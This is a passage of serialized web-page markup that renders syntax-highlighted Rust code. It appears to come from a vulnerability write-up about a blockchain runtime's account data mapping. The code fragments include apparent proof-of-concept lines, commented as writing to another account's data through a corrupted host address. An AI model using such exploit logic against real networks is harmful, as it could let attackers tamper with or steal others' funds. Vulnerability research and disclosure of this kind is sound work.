token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb28:[\"$\",\"span\",\"code-segment-399\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nb29:[\"$\",\"span\",\"code-segment-400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb2a:[\"$\",\"span\",\"code-segment-401\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nb2b:[\"$\",\"span\",\"code-segment-402\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb2c:[\"$\",\"span\",\"code-segment-403\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb2d:[\"$\",\"span\",\"code-segment-404\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}]\nb2e:[\"$\",\"span\",\"code-segment-405\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb2f:[\"$\",\"span\",\"code-segment-406\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]"])</script><script>self.__next_f.push([1,"\nb30:[\"$\",\"span\",\"code-segment-407\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb31:[\"$\",\"span\",\"code-segment-408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb32:[\"$\",\"span\",\"code-segment-409\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb33:[\"$\",\"span\",\"code-segment-410\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb34:[\"$\",\"span\",\"code-segment-411\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\nb35:[\"$\",\"span\",\"code-segment-412\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb36:[\"$\",\"span\",\"code-segment-413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb37:[\"$\",\"span\",\"code-segment-414\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb38:[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[56]}]\nb39:[\"$\",\"span\",\"code-segment-416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\nb3a:[\"$\",\"span\",\"code-segment-417\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb3b:[\"$\",\"span\",\"code-segment-418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb3c:[\"$\",\"span\",\"line-number--57\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[57]}]\nb3d:[\"$\",\"span\",\"code-segment-420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nb3e:[\"$\",\"span\",\"code-segment-421\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb3f:[\"$\",\"span\",\"code-segment-422\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"c"])</script><script>self.__next_f.push([1,"hildren\":[\",\"]}]\nb40:[\"$\",\"span\",\"code-segment-423\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb41:[\"$\",\"span\",\"line-number--58\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[58]}]\nb42:[\"$\",\"span\",\"code-segment-425\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nb43:[\"$\",\"span\",\"code-segment-426\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nb44:[\"$\",\"span\",\"code-segment-427\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb45:[\"$\",\"span\",\"code-segment-428\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb46:[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[59]}]\nb47:[\"$\",\"span\",\"code-segment-430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            accounts\"]}]\nb48:[\"$\",\"span\",\"code-segment-431\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb49:[\"$\",\"span\",\"code-segment-432\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nb4a:[\"$\",\"span\",\"code-segment-433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb4b:[\"$\",\"span\",\"code-segment-434\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb4c:[\"$\",\"span\",\"code-segment-435\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\nb4d:[\"$\",\"span\",\"code-segment-436\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb4e:[\"$\",\"span\",\"code-segment-437\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb4f:[\"$\",\"span\",\"code-segment-438\",{\"classNa"])</script><script>self.__next_f.push([1,"me\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb50:[\"$\",\"span\",\"code-segment-439\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb51:[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[60]}]\nb52:[\"$\",\"span\",\"code-segment-441\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nb53:[\"$\",\"span\",\"code-segment-442\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb54:[\"$\",\"span\",\"code-segment-443\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb55:[\"$\",\"span\",\"code-segment-444\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb56:[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[61]}]\nb57:[\"$\",\"span\",\"code-segment-446\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nb58:[\"$\",\"span\",\"code-segment-447\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nb59:[\"$\",\"span\",\"code-segment-448\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb5a:[\"$\",\"span\",\"code-segment-449\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb5b:[\"$\",\"span\",\"code-segment-450\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb5c:[\"$\",\"span\",\"code-segment-451\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb5d:[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px s"])</script><script>self.__next_f.push([1,"olid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[62]}]\nb5e:[\"$\",\"span\",\"code-segment-453\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nb5f:[\"$\",\"span\",\"code-segment-454\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb60:[\"$\",\"span\",\"code-segment-455\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\nb61:[\"$\",\"span\",\"code-segment-456\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nb62:[\"$\",\"span\",\"code-segment-457\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb63:[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[63]}]\nb64:[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[64]}]\nb65:[\"$\",\"span\",\"code-segment-461\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nb66:[\"$\",\"span\",\"code-segment-462\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// this will write to accounts[1].data due to corrupted region.host_addr\"]}]\nb67:[\"$\",\"span\",\"code-segment-463\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb68:[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[65]}]\nb69:[\"$\",\"span\",\"code-segment-465\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}]\nb6a:[\"$\",\"span\",\"code-segment-466\",{\"className\":\"token token\",\"styl"])</script><script>self.__next_f.push([1,"e\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb6b:[\"$\",\"span\",\"code-segment-467\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\nb6c:[\"$\",\"span\",\"code-segment-468\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb6d:[\"$\",\"span\",\"code-segment-469\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb6e:[\"$\",\"span\",\"code-segment-470\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nb6f:[\"$\",\"span\",\"code-segment-471\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nb70:[\"$\",\"span\",\"code-segment-472\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}]\nb71:[\"$\",\"span\",\"code-segment-473\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb72:[\"$\",\"span\",\"code-segment-474\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb73:[\"$\",\"span\",\"code-segment-475\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nb74:[\"$\",\"span\",\"code-segment-476\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"10\"]}]\nb75:[\"$\",\"span\",\"code-segment-477\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nb76:[\"$\",\"span\",\"code-segment-478\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb77:[\"$\",\"span\",\"code-segment-479\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nb78:[\"$\",\"span\",\"code-segment-480\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb79:[\"$\",\"span\",\"code-segment-481\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nb7a:[\"$\",\"span\",\"code-segment-482\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nb7b:[\"$\",\"span\",\"code-segment-483\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb7c:[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRigh"])</script><script>self.__next_f.push([1,"t\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[66]}]\nb7d:[\"$\",\"span\",\"code-segment-485\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nb7e:[\"$\",\"span\",\"code-segment-486\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\nb7f:[\"$\",\"span\",\"code-segment-487\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb80:[\"$\",\"span\",\"code-segment-488\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nb81:[\"$\",\"span\",\"code-segment-489\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb82:[\"$\",\"span\",\"code-segment-490\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb83:[\"$\",\"span\",\"code-segment-491\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb84:[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[67]}]\nb85:[\"$\",\"span\",\"code-segment-493\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nb86:[\"$\",\"span\",\"code-segment-494\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nb87:[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    callee_account\"]}]\nb88:[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nb89:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb8a:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nb8b:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"BorrowedAccount\"]}]\nb8c:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nb8d:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8"])</script><script>self.__next_f.push([1,"c555\"},\"children\":[\"'_\"]}]\nb8e:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nb8f:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb90:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb91:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nb92:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}]\nb93:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\nb94:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb95:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\nb96:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nb97:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nb98:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\nb99:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nb9a:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nb9b:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nb9c:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\nb9d:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}"])</script><script>self.__next_f.push([1,"]\nb9e:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}]\nb9f:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nba0:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nba1:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nba2:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nba3:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nba4:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}]\nba5:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nba6:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nba7:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nba8:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nba9:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\nbaa:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nbab:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nbac:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbad:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}]\nbae:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbaf:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\""])</script><script>self.__next_f.push([1,"{\"]}]\nbb0:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbb1:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\nbb2:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        original_data_len\"]}]\nbb3:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nbb4:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbb5:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\nbb6:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_data_addr\"]}]\nbb7:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nbb8:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbb9:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\nbba:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nbbb:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"..\"]}]\nbbc:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbbd:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\""])</script><script>self.__next_f.push([1,":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\nbbe:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nbbf:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nbc0:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbc1:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nbc2:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}]\nbc3:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nbc4:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nbc5:[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\nbc6:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\nbc7:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nbc8:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nbc9:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data_region \"]}]\nbca:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\nbcb:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbcc:[\"$\",\"s"])</script><script>self.__next_f.push([1,"pan\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"account_data_region\"]}]\nbcd:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nbce:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"memory_mapping\"]}]\nbcf:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nbd0:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbd1:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nbd2:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}]\nbd3:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nbd4:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nbd5:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token 